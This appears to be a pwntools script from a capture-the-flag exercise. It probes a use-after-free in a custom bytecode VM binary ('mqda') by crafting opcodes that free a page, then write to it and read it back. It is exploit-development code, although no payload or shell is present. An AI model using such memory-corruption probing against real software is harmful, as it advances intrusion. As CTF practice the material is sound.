#!/usr/bin/env python3
"""Debug the UAF - verify each step"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def jmp_reg(reg):
    return bytes([0x0E, reg])

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

# Test 1: Just verify the oracle still works
code_addr = 0x10000

# Simple test: write and read back
code = b''
code += mov_reg_imm(15, 0x10000)
code += mov_reg_imm(0, 0xDEADBEEF)
code += push_reg(0)
code += mov_reg_imm(15, 0x10000)
code += pop_reg(1)
code += bytes([0x2D, 0, 1])  # CMP r0, r1

# If equal, jump to HLT, else ILLEGAL
jne_addr = len(code) + code_addr + 6 + 2 + 1
code += mov_reg_imm(2, jne_addr)
code += bytes([0x10, 2])  # JNE
code += bytes([0xFF])     # ILLEGAL
code += hlt()

print("[*] Test 1: Basic read/write")
p = process(['./mqda'])
p.recvuntil(b'Code Address> ')
p.sendline(str(code_addr).encode())
p.recvuntil(b'Code Length> ')
p.sendline(str(len(code)).encode())
p.recvuntil(b'Code> ')
p.send(code)
p.recvuntil(b'Entry IP> ')
p.sendline(str(code_addr).encode())
output = p.recvall(timeout=2)
print(f"Result: {output}")
p.close()

# Test 2: Zero page, write to it, read back
code = b''
# Put our real code at page 0x10100
code += mov_reg_imm(0, 0x10100)  # Jump target
code += jmp_reg(0)
code = code.ljust(256, b'\xff')

# Page 2 (0x10100): zero page 0x10000, write to it, read back
code2 = b''
# Zero page 0x10000
for offset in range(0, 256, 4):
    sp = 0x10000 | offset
    code2 += mov_reg_imm(15, sp)
    code2 += mov_reg_imm(0, 0)
    code2 += push_reg(0)

# Page is now freed. Write magic value to prove we can reuse it
code2 += mov_reg_imm(15, 0x10000)
code2 += mov_reg_imm(0, 0xCAFEBABE)
code2 += push_reg(0)

# Read it back
code2 += mov_reg_imm(15, 0x10000)
code2 += pop_reg(1)

# Compare
code2 += mov_reg_imm(0, 0xCAFEBABE)
code2 += bytes([0x2D, 0, 1])

jne_addr = len(code) + len(code2) + 6 + 2 + 1
code2 += mov_reg_imm(2, jne_addr)
code2 += bytes([0x10, 2])
code2 += bytes([0xFF])
code2 += hlt()

full = code + code2

print("\n[*] Test 2: Zero page, write, read back")
p = process(['./mqda'])
p.recvuntil(b'Code Address> ')
p.sendline(str(code_addr).encode())
p.recvuntil(b'Code Length> ')
p.sendline(str(len(full)).encode())
p.recvuntil(b'Code> ')
p.send(full)
p.recvuntil(b'Entry IP> ')
p.sendline(str(code_addr).encode())
output = p.recvall(timeout=3)
print(f"Result: {output}")
if b'TERMINATED' in output:
    print("[+] Read back correct value after page freed+reallocated!")
p.close()
